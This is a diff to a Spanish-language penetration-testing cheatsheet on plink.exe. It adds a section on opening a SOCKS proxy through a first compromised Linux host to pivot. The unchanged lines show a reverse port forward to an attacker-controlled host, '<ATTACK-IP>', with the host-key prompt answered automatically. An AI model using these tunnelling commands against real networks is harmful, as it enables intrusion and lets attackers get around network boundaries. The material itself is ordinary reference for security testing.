@@ -21,6 +21,11 @@ puttygen <PRIVATE-KEY> -o key.ppk
 cmd.exe /c echo y | .\plink.exe -R <ATTACK-PORT>:<TARGET-IP>:<TARGET-PORT> <USERNAME>@<ATTACK-IP> -i key.ppk -N
 ```
 
+#### Pivoting SSH
+```
+plink.exe -ssh -D 9050 <USER-SSH>@<IP-PRIMER-EQUIPO-LINUX>
+```
+
 ---
 
 [:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)
